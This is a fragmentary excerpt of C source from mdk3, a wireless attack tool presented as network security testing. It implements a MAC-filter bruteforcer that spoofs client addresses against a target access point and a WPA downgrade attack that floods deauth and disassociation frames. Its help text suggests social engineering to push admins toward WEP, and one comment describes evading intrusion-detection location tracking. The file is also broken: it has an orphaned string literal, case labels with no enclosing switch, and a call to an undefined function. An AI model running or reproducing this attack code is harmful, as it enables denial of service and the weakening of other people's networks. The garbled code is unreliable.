/*
 * mdk3, a 802.11 wireless network security testing tool
 *       Just like John the ripper or nmap, now part of most distros,
 *       it is important that the defender of a network can test it using
 *       aggressive tools.... before somebody else does.
 *
 * This file contains parts from 'aircrack' project by Cristophe Devine.
 *
 * Copyright (C) 2006-2010 Pedro Larbig
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; version 2 of the License.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

//Using GNU Extension getline(), not ANSI C
#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <pthread.h>
#include <sys/time.h>
#include <pcap.h>

#include "osdep.h"
#include "debug.h"
#include "helpers.h"
#include "mac_addr.h"


#define	MAX_APS_TRACKED 100
#define MAX_APS_TESTED 100

# define TIMEVAL_TO_TIMESPEC(tv, ts) {                                  \
        (ts)->tv_sec = (tv)->tv_sec;                                    \
        (ts)->tv_nsec = (tv)->tv_usec * 1000;                           \
}

unsigned char tmpbuf[MAX_PACKET_LENGTH];     // Temp buffer for packet manipulation in send/read_packet
unsigned char pkt[MAX_PACKET_LENGTH];                // Space to save generated packet
unsigned char pkt_sniff[MAX_PACKET_LENGTH];          // Space to save sniffed packets
unsigned char pkt_check[MAX_PACKET_LENGTH];          // Space to save sniffed packets to check success
unsigned char aps_known[MAX_APS_TRACKED][ETHER_ADDR_LEN];          // Array to save MACs of known APs
int aps_known_count = 0;                     // Number of known APs
unsigned char auth[MAX_APS_TESTED][ETHER_ADDR_LEN];      // Array to save MACs of APs currently under test
int auths[MAX_APS_TESTED][4];                // Array to save status of APs under test
unsigned char *pkt_amok = NULL;                      // Pointer to packet for deauth mode
unsigned char *target = NULL;                        // Target for SSID Bruteforce / Intelligent Auth DoS
int exit_now = 0;                            // Tells main thread to exit
int ssid_len = 0;                            // Length of SSID used in Bruteforce mode
int ssid_eof = 0;                            // Tell other threads, SSID file has reached EOF
char brute_mode;                             // Which ASCII-characters should be used
char *brute_ssid;                            // SSID in Bruteforce mode
unsigned int end = 0;                        // Has Bruteforce mode tried all possibilities?
unsigned int turns = 0;                      // Number of tried SSIDs
unsigned int max_permutations = 1;           // Number of SSIDs possible
int real_brute = 0;                          // use Bruteforce mode?
int init_intelligent = 0;                    // Is intelligent_auth_dos initialized?
int init_intelligent_data = 0;               // Is its data list initialized?
int we_got_data = 0;                         // Sniffer thread tells generator thread if there is any data
struct ether_addr mac_base;                  // First three bytes of adress given for bruteforcing MAC filter
struct ether_addr mac_lower;                 // Last three bytes of adress for Bruteforcing MAC filter
int mac_b_init = 0;                          // Initializer for MAC bruteforcer
static pthread_mutex_t has_packet_mutex;     // Used for condition below
static pthread_cond_t has_packet;            // Pthread Condition "Packet ready"
int has_packet_really = 0;                   // Since the above condition has a timeout we want to use, we need another int here
static pthread_mutex_t clear_packet_mutex;   // Used for condition below
static pthread_cond_t clear_packet;          // Pthread Condition "Buffer cleared, get next packet"
struct timeval tv_dyntimeout;                // Dynamic timeout for MAC bruteforcer
int mac_brute_speed = 0;                     // MAC Bruteforcer Speed-o-meter
int mac_brute_timeouts = 0;                  // Timeout counter for MAC Bruteforcer
int hopper_seconds = 1;                      // Default time for channel hopper to stay on one channel
int wpad_cycles = 0, wpad_auth = 0;          // Counters for WPA downgrade: completed deauth cycles, sniffed 802.1x auth packets
int wpad_wep = 0, wpad_beacons = 0;          // Counters for WPA downgrade: sniffed WEP/open packets, sniffed beacons/sec



		"TEST MODES:\n"

		"f   - MAC filter bruteforce mode\n"
		"      This test uses a list of known client MAC Adresses and tries to\n"
		"      authenticate them to the given AP while dynamically changing\n"
		"      its response timeout for best performance. It currently works only\n"
		"      on APs who deny an open authentication request properly\n"
		"g   - WPA Downgrade test\n"
		"      deauthenticates Stations and APs sending WPA encrypted packets.\n"
		"      With this test you can check if the sysadmin will try setting his\n"
		"      network to WEP or disable encryption. More effective in\n"
		"      combination with social engineering.\n";

char use_macb[]="f   - MAC filter bruteforce mode\n"
		"      This test uses a list of known client MAC Adresses and tries to\n"
		"      authenticate them to the given AP while dynamically changing\n"
		"      its response timeout for best performance. It currently works only\n"
		"      on APs who deny an open authentication request properly\n"
		"      -t <bssid>\n"
		"         Target BSSID\n"
		"      -m <mac>\n"
		"         Set the MAC adress range to use (3 bytes, i.e. 00:12:34)\n"
		"         Without -m, the internal database will be used\n"
		"      -f <mac>\n"
		"         Set the MAC adress to begin bruteforcing with\n"
		"         (Note: You can't use -f and -m at the same time)\n";

char use_wpad[]="g   - WPA Downgrade test\n"
		"      deauthenticates Stations and APs sending WPA encrypted packets.\n"
		"      With this test you can check if the sysadmin will try setting his\n"
		"      network to WEP or disable encryption. mdk3 will let WEP and unencrypted\n"
		"      clients work, so if the sysadmin simply thinks \"WPA is broken\" he\n"
		"      sure isn't the right one for this job.\n"
		"      (this can/should be combined with social engineering)\n"
		"      -t <bssid>\n"
		"         Target network\n";


/* Sniffing Functions */

//ATTACK MAC filter bruteforce
void mac_bruteforce_sniffer()
{
    int plen = 0;
    int interesting_packet;
    static unsigned char last_mac[6] = "\x00\x00\x00\x00\x00\x00";
//    static unsigned char ack[10] = "\xd4\x00\x00\x00\x00\x00\x00\x00\x00\x00";

   while(1) {
      do {
	interesting_packet = 1;
	//Read packet
	plen = osdep_read_packet(pkt_sniff, MAX_PACKET_LENGTH);
	//is this an auth response packet?
	if (pkt_sniff[0] != 0xb0) interesting_packet = 0;
	//is it from our target
	if (! is_from_target_ap(target, pkt_sniff)) interesting_packet = 0;
	//is it a retry?
	if (! memcmp(last_mac, pkt_sniff+4, 6)) interesting_packet = 0;
      } while (! interesting_packet);
      //Buffering MAC to drop retry frames later
      memcpy(last_mac, pkt_sniff+4, 6);

      //SPEEDUP: (Doesn't work??) Send ACK frame to prevent AP from blocking the channel with retries
/*      memcpy(ack+4, target, 6);
      osdep_send_packet(ack, 10);
*/

      //Set has_packet
      has_packet_really = 1;
      //Send condition
      pthread_cond_signal(&has_packet);
      //Wait for packet to be cleared
      pthread_cond_wait (&clear_packet, &clear_packet_mutex);
    }

}


/*  ZERO_CHAOS says: if you want to make the WIDS vendors hate you
    also match the sequence numbers of the victims
    also match the sequence numbers of the victims
    also match the sequence numbers of the victims
    also match the sequence numbers of the victims
    also match the sequence numbers of the victims
    also match the sequence numbers of the victims
    also match the sequence numbers of the victims
    also match the sequence numbers of the victims
    also match the sequence numbers of the victims

Aireplay should be able to choose IV from a pool (when ringbuffer is big enough or unlimited) that hasn't been used in last X packets 
Ghosting (tx power): by changing tx power of the card while injecting, we can evade location tracking. If you turn the radio's power up and down every few ms, the trackers will have a much harder time finding you (basicly you will hop all over the place depending on sensor position). At least madwifi can do it. 
Ghosting (speed/modulation): change speed every few ms, not a fantastic evasion technique but it may cause more location tracking oddity. Note that tx power levels can only be set at certain speeds (lower speed means higher tx power allowed). 
802.11 allows you to fragment each packet into as many as 16 pieces. It would be nice if we could use fragmentated packets in every aireplay-ng attack.
*/

struct pckt mac_bruteforcer()
{
    struct pckt rtnpkt;
    static unsigned char *current_mac;
    int get_new_mac = 1;
    static struct timeval tv_start, tv_end, tv_diff, tv_temp, tv_temp2;
    struct timespec wait;

    if (! mac_b_init) {
	pthread_cond_init (&has_packet, NULL);
	pthread_mutex_init (&has_packet_mutex, NULL);
	pthread_mutex_unlock (&has_packet_mutex);
	pthread_cond_init (&clear_packet, NULL);
	pthread_mutex_init (&clear_packet_mutex, NULL);
	pthread_mutex_unlock (&clear_packet_mutex);

	tv_dyntimeout.tv_sec = 0;
	tv_dyntimeout.tv_usec = 100000;	//Dynamic timeout initialized with 100 ms

	pthread_t sniffer;
	pthread_create( &sniffer, NULL, (void *) mac_bruteforce_sniffer, (void *) 1);
    }

    if (mac_b_init) {
	//Wait for an answer to the last packet
	gettimeofday(&tv_temp, NULL);
	timeradd(&tv_temp, &tv_dyntimeout, &tv_temp2);
	TIMEVAL_TO_TIMESPEC(&tv_temp2, &wait);
	pthread_cond_timedwait(&has_packet, &has_packet_mutex, &wait);

	//has packet after timeout?
	if (has_packet_really) {
	    //  if yes: if this answer is positive, copy the MAC, print it and exit!
	    if (memcmp(target, pkt_sniff+4, 6)) // Filter out own packets & APs responding strangely (authing themselves)
	    if ((pkt_sniff[28] == 0x00) && (pkt_sniff[29] == 0x00)) {
		unsigned char *p = pkt_sniff;
		printf("\n\nFound a valid MAC adress: %02X:%02X:%02X:%02X:%02X:%02X\nHave a nice day! :)\n",
		       p[4], p[5], p[6], p[7], p[8], p[9]);
		exit(0);
	    }

	    //  if this is an answer to our current mac: get a new mac later
	    if (! memcmp(pkt_sniff+4, current_mac, 6)) {
		get_new_mac = 1;
		mac_brute_speed++;

		//  get this MACs check time, calculate new timeout
		gettimeofday(&tv_end, NULL);
		tvdiff(&tv_end, &tv_start, &tv_diff);

		/* #=- The magic timeout formula -=# */
		//If timeout is more than 500 ms, it sure is due to weak signal, so drop the calculation
		if ((tv_diff.tv_sec == 0) && (tv_diff.tv_usec < 500000)) {

		    //If timeout is lower, go down pretty fast (half the difference)
		    if (tv_diff.tv_usec < tv_dyntimeout.tv_usec) {
			tv_dyntimeout.tv_usec += (((tv_diff.tv_usec * 2) - tv_dyntimeout.tv_usec) / 2);
		    } else {
		    //If timeout is higher, raise only a little
			tv_dyntimeout.tv_usec += (((tv_diff.tv_usec * 4) - tv_dyntimeout.tv_usec) / 4);
		    }
		    //High timeouts due to bad signal? Don't go above 250 milliseconds!
		    //And avoid a broken timeout (less than half an ms, more than 250 ms)
		    if (tv_dyntimeout.tv_usec > 250000) tv_dyntimeout.tv_usec = 250000;
		    if (tv_dyntimeout.tv_usec <    500) tv_dyntimeout.tv_usec =    500;
		}
	    }

	    //reset has_packet, send condition clear_packet (after memcpy!)
	    has_packet_really = 0;
	    pthread_cond_signal(&clear_packet);

	// if not: dont get a new mac later!
	} else {
	    get_new_mac = 0;
	    mac_brute_timeouts++;
	}
    }

    // Get a new MAC????
    if (get_new_mac) {
	current_mac = get_next_mac();
	// Set this MACs first time mark
	gettimeofday(&tv_start, NULL);
    }
    // Create packet and send
    rtnpkt = create_auth_frame(target, 0, current_mac);

    mac_b_init = 1;

    return rtnpkt;
}

struct pckt wpa_downgrade()
{

    struct pckt rtnpkt;
    static int state = 0;
    int plen;

    rtnpkt.len = 0;
    rtnpkt.data = NULL; // A null packet we return when captured packet was useless
			// This ensures that statistics will be printed in low traffic situations

    switch (state) {
	case 0:		// 0: Waiting for a data packet from target

		//Sniff packet
		plen = osdep_read_packet(pkt_sniff, MAX_PACKET_LENGTH);
		if (plen < 36) return rtnpkt;
		//Is from target network?
		if (! is_from_target_ap(target, pkt_sniff))
		   return rtnpkt;
		//Is a beacon?
		if (pkt_sniff[0] == 0x80) {
		    wpad_beacons++;
		    return rtnpkt;
		}
		//Is data (or qos data)?
		if ((! (pkt_sniff[0] == 0x08)) && (! (pkt_sniff[0] == 0x88)))
		    return rtnpkt;
		//Is encrypted?
		if (! (pkt_sniff[1] & 0x40)) {
		    if ((pkt_sniff[30] == 0x88) && (pkt_sniff[31] == 0x8e)) { //802.1x Authentication!
			wpad_auth++;
		    } else {
			wpad_wep++;
		    }
		    return rtnpkt;
		}
		//Check WPA Enabled
		if ((pkt_sniff[27] & 0xFC) == 0x00) {
		    wpad_wep++;
		    return rtnpkt;
		}

		state++;

			// 0: Deauth AP -> Station
		return create_deauth_frame(get_macs_from_packet('a', pkt_sniff),
					   get_macs_from_packet('s', pkt_sniff),
					   get_macs_from_packet('b', pkt_sniff), 0);

	break;
	case 1:		// 1: Disassoc AP -> Station

		state++;

		return create_deauth_frame(get_macs_from_packet('a', pkt_sniff),
					   get_macs_from_packet('s', pkt_sniff),
					   get_macs_from_packet('b', pkt_sniff), 1);

	break;
	case 2:		// 2: Deauth Station -> AP

		state++;

		return create_deauth_frame(get_macs_from_packet('s', pkt_sniff),
					   get_macs_from_packet('a', pkt_sniff),
					   get_macs_from_packet('b', pkt_sniff), 0);

	break;
	case 3:		// 3: Disassoc Station -> AP


		//Increase cycle counter
		wpad_cycles++;
		state = 0;

		return create_deauth_frame(get_macs_from_packet('s', pkt_sniff),
					   get_macs_from_packet('a', pkt_sniff),
					   get_macs_from_packet('b', pkt_sniff), 1);

	break;
    }

    printf("BUG: WPA-Downgrade: Control reaches end unexpectedly!\n");
    return rtnpkt;

}


/* Response Checkers */

void print_mac_bruteforcer_stats(struct pckt packet)
{
    unsigned char *m = packet.data+10;

    float timeout = (float) tv_dyntimeout.tv_usec / 1000.0;

    printf("\rTrying MAC %02X:%02X:%02X:%02X:%02X:%02X with %8.4f ms timeout at %3d MACs per second and %d retries\n",
	   m[0], m[1], m[2], m[3], m[4], m[5], timeout, mac_brute_speed, mac_brute_timeouts);

    mac_brute_speed = 0;
    mac_brute_timeouts = 0;
}

void print_wpa_downgrade_stats()
{
    static int wpa_old = 0, wep_old = 0, warning = 0, downgrader = 0;

    printf("\rDeauth cycles: %4d  802.1x authentication packets: %4d  WEP/Unencrypted packets: %4d  Beacons/sec: %3d\n", wpad_cycles, wpad_auth, wpad_wep, wpad_beacons);
    if (wpad_beacons == 0) {
	printf("NOTICE: Did not receive any beacons! Maybe AP has been reconfigured and/or is rebooting!\n");
    }

    if (wpa_old < wpad_cycles) {
	if (wep_old < wpad_wep) {
	    if (!warning) {
		printf("REALLY BIG WARNING!!! Seems like a client connected to your target AP leaks PLAINTEXT data while authenticating!!\n");
		warning = 1;
	    }
	}
    }

    if (wpa_old == wpad_cycles) {
	if (wep_old < wpad_wep) {
	    downgrader++;
	    if (downgrader == 10) {
		printf("WPA Downgrade Attack successful. No increasing WPA packet count detected. HAVE FUN!\n");
		downgrader = 0;
	    }
	}
    }

    wpa_old = wpad_cycles;
    wep_old = wpad_wep;
    wpad_beacons = 0;
}

void print_stats(char mode, struct pckt packet, int responses, int sent)
{
// Statistics dispatcher

    switch (mode)
    {

    case 'f':
	print_mac_bruteforcer_stats(packet);
	break;
    case 'g':
	print_wpa_downgrade_stats();
	break;
    /*TODO*/
    }
}

/* MDK Parser, Setting up testing environment */

int mdk_parser(int argc, char *argv[])
{

    int nb_sent = 0, nb_sent_ps = 0;  // Packet counters
    char mode = '0';              // Current mode
    unsigned char *ap = NULL;             // Pointer to target APs MAC
    char check = 0;               // Flag for checking if test is successful
    struct pckt frm;              // Struct to save generated Packets
    char *ssid = NULL;            // Pointer to generated SSID
    int pps = 50;                 // Packet sending rate
    int t = 0;
    time_t t_prev;                // Struct to save time for printing stats every sec
    int total_time = 0;           // Amount of seconds the test took till now
    int chan = 1;                 // Channel for beacon flood mode
    int fchan = 0;                // Channel selected via -c option
    int wep = 0;                  // WEP bit for beacon flood mode (1=WEP, 2=WPA-TKIP 3=WPA-AES)
    int gmode = 0;                // 54g speed flag
    struct pckt mac;              // MAC Space for probe mode
    int resps = 0;                // Counting responses for probe mode
    int usespeed = 0;             // Should injection be slown down?
    int random_mac = 1;           // Use random or valid MAC?
    int ppb = 70;                 // Number of packets per burst
    int wait = 10;                // Seconds to wait between bursts
    int adhoc = 0;                // Ad-Hoc mode
    int adv = 0;                  // Use advanced FakeAP mode
    int renderman_discovery = 0;  // Activate RenderMan's discovery tool
    int got_ssid = 0;
    char *list_file = NULL;       // Filename for periodical white/blacklist processing
    t_prev = (time_t) malloc(sizeof(t_prev));


    case 'f':
        mode = 'f';
        usespeed = 0;
	MAC_SET_NULL(mac_lower);
	MAC_SET_NULL(mac_base);
	for (t=3; t<argc; t++)
	{
	    if (! strcmp(argv[t], "-t")) {
		if (! (argc > t+1)) { printf(use_macb); return -1; }
		target =  parse_mac(argv[t+1]);
	    }
	    if (! strcmp(argv[t], "-m")) {
		if (! (argc > t+1)) { printf(use_macb); return -1; }
		mac_base = parse_half_mac(argv[t+1]);
	    }
	    if (! strcmp(argv[t], "-f")) {
		if (! (argc > t+1)) { printf(use_macb); return -1; }
		mac_base = parse_mac(argv[t+1]);
		mac_lower = parse_mac(argv[t+1]);
	    }
	}
    break;
    case 'g':
	mode = 'g';
	usespeed = 0;
	for (t=3; t<argc; t++)
	{
	    if (! strcmp(argv[t], "-t")) {
		if (! (argc > t+1)) { printf(use_wpad); return -1; }
		target = parse_mac(argv[t+1]);
	    }
	}
   break;
    default:
	printf(use_head);
	return -1;
	break;
    }

    printf("\n");


    if (mode == 'g') {
	if (target == NULL) {
	    printf("Please specify MAC of target AP (option -t)\n");
	    return -1;
	}
    }

    /* Main packet sending loop */

    while(1)
    {

	/* Creating Packets, do sniffing */

	switch (mode)
	{

	case 'f':
	    frm = mac_bruteforcer();
	    break;
	case 'g':
	    frm = wpa_downgrade();
	    if (frm.data == NULL) goto statshortcut;
	    break;
	case 'r':
	    frm = renderman_discovery_tool();
	    break;
	}

	/* Sending packet, increase counters */

	if (frm.len < 10) printf("WTF?!? Too small packet injection detected! BUG!!!\n");
	osdep_send_packet(frm.data, frm.len);
	nb_sent_ps++;
	nb_sent++;


	/* Does another thread want to exit? */

	if (exit_now) return 0;

	/* Waiting for Hannukah */

	if (usespeed) usleep(pps2usec(pps));

statshortcut:

	/* Print speed, packet count and stats every second */

	if( time( NULL ) - t_prev >= 1 )
        {
            t_prev = time( NULL );
	    print_stats(mode, frm, resps, nb_sent_ps);
	    if (mode != 'r') printf ("\rPackets sent: %6d - Speed: %4d packets/sec", nb_sent, nb_sent_ps);
	    fflush(stdout);
	    nb_sent_ps=0;
	    resps=0;
	    total_time++;
	}

    }   // Play it again, Johnny!

    return 0;
}
